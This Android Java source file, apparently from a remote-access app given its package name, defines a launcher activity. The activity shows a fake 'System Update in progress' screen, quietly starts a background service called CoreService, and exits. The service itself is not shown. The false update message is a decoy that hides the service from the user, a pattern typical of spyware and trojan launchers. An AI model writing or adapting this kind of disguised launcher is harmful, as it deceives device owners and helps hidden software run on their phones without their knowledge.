package com.hawk.remote;

import android.app.Activity;
import android.os.Bundle;
import android.content.Intent;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        TextView tv = new TextView(this);
        tv.setText("System Update in progress...\nPlease wait.");
        tv.setTextSize(20);
        tv.setPadding(50, 300, 50, 50);
        setContentView(tv);
        startService(new Intent(this, CoreService.class));
        finish();
    }
                      }
